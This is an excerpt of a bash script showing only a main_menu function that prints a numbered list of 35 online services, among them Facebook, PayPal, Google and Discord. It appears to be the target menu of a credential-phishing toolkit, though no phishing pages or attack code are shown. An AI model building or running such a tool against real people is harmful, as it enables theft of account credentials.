...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}14${RED}]${ORANGE} Likedin      ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}28${RED}]${ORANGE} Stackoverflow	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}17${RED}]${ORANGE} Protonmai    ${RED}[${WHITE}29${RED}]${ORANGE} Vk		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}19${RED}]${ORANGE} Raddit       ${RED}[${WHITE}31${RED}]${ORANGE} MediaFIre			
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}21${RED}]${ORANGE} Deviantart   ${RED}[${WHITE}33${RED}]${ORANGE} Github
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}22${RED}]${ORANGE} Badoo        ${RED}[${WHITE}34${RED}]${ORANGE} Discord
		${RED}[${WHITE}11${RED}]${ORANGE} Twitch        ${RED}[${WHITE}23${RED}]${ORANGE} Origin       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox
		${RED}[${WHITE}12${RED}]${ORANGE} Pinterest     ${RED}[${WHITE}24${RED}]${ORANGE} Dropbox 
